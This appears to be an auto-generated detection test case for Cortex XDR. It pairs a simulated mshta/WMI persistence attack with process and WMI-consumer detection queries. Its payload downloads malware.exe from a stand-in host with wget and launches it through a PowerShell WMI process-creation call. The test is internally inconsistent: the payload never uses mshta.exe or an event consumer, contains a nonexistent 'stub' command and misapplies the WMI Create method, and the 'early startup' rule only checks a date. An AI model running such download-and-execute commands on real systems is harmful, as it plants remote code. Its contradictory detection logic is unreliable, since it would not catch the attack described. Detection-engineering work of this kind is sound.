identity.summary: An attacker uses mshta.exe to execute a malicious script at system startup, leveraging WMI event consumers for persistence. Cortex should detect the execution of an uncommon process at an early startu
identity.description: An attacker uses mshta.exe to execute a malicious script at system startup, leveraging WMI event consumers for persistence. Cortex should detect the execution of an uncommon process at an early startup stage by a Windows system binary.

payload.code:
mkdir C:\Windows\Temp\test
wget https://example.com/malware.exe -O C:\Windows\Temp\test\malware.exe
stub C:\Windows\Temp\test\malware.exe
powershell -Command "Get-WmiObject -Class Win32_Process | Where-Object {$_.Name -eq 'svchost.exe'} | ForEach-Object { $proc = $_; $proc | Invoke-WmiMethod -MethodName Create -ArgumentList 'C:\Windows\Temp\test\malware.exe'}"

expected_artifacts.description: Execution of mshta.exe from a system binary context

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Uncommon Process Execution by System Binary
biocs.description: Detection of mshta.exe execution initiated by a Windows system binary like svchost.exe
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'svchost.exe' and action_process_image_name = 'mshta.exe'
| filter action_process_image_name not in ('explorer.exe', 'svchost.exe', 'wmiprvse.exe')

abiocs.name: Early Startup Execution by System Binary
abiocs.description: Behavioral deviation where mshta.exe is executed by a system binary during early startup
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'svchost.exe' and action_process_image_name = 'mshta.exe'
| filter action_process_image_name not in ('explorer.exe', 'svchost.exe', 'wmiprvse.exe')
| filter timestamp > '2023-01-01T00:00:00Z'

xql_queries.name: Detect WMI Event Consumer Creation
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.WMI and event_sub_type = ENUM.WMI_EVENT_CONSUMER_CREATE
| filter action_process_image_name = 'mshta.exe'
| filter actor_process_image_name = 'svchost.exe'
